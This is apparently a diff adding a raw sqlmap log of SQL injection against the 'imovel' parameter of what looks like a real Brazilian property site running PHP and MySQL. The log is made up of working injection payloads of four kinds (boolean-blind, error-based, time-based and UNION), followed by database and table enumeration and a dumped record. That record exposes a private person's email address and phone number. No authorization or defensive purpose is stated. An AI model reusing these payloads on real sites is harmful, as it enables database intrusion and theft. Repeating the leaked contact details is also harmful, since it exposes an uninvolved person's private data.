@@ -1,0 +1,103 @@
+sqlmap identified the following injection point(s) with a total of 157 HTTP(s) requests:
+---
+Parameter: imovel (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: mostra=mostra&imovel=18402 AND 5447=5447
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: mostra=mostra&imovel=18402 AND (SELECT 1113 FROM(SELECT COUNT(*),CONCAT(0x7170787171,(SELECT (ELT(1113=1113,1))),0x7162767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: mostra=mostra&imovel=18402 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: mostra=mostra&imovel=18402 UNION ALL SELECT CONCAT(0x7170787171,0x4f51776b4e4a536f464367626770614d4570726a7a6a5066664e6f6b6a6966424646516948617656,0x7162767171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mzXJ
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] imoveis_central
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: imovel (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: mostra=mostra&imovel=18402 AND 5447=5447
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: mostra=mostra&imovel=18402 AND (SELECT 1113 FROM(SELECT COUNT(*),CONCAT(0x7170787171,(SELECT (ELT(1113=1113,1))),0x7162767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: mostra=mostra&imovel=18402 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: mostra=mostra&imovel=18402 UNION ALL SELECT CONCAT(0x7170787171,0x4f51776b4e4a536f464367626770614d4570726a7a6a5066664e6f6b6a6966424646516948617656,0x7162767171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mzXJ
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: imoveis_central
+[2 tables]
++---------+
+| eventos |
+| imoveis |
++---------+
+
+Database: imoveis_central
++---------+---------+
+| Table   | Entries |
++---------+---------+
+| imoveis | 3585    |
+| eventos | 1       |
++---------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: imovel (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: mostra=mostra&imovel=18402 AND 5447=5447
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: mostra=mostra&imovel=18402 AND (SELECT 1113 FROM(SELECT COUNT(*),CONCAT(0x7170787171,(SELECT (ELT(1113=1113,1))),0x7162767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: mostra=mostra&imovel=18402 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: mostra=mostra&imovel=18402 UNION ALL SELECT CONCAT(0x7170787171,0x4f51776b4e4a536f464367626770614d4570726a7a6a5066664e6f6b6a6966424646516948617656,0x7162767171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mzXJ
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: imoveis_central
+Table: eventos
+[1 entry]
++----+------------+------------+----------+---------------------------+----------+-----------------+-----------+-------------------------------------------------------+
+| ID | localidade | data       | tempo    | email                     | destaque | telefone        | categoria | descricao                                             |
++----+------------+------------+----------+---------------------------+----------+-----------------+-----------+-------------------------------------------------------+
+| 1  | Ponunduva  | 2017-11-09 | 16:46:53 | samantasartorii@gmail.com | 0        | (11) 95550 5090 | Chácara   | Linda chácara para festas e eventos localizada na Rua |
++----+------------+------------+----------+---------------------------+----------+-----------------+-----------+-------------------------------------------------------+
+
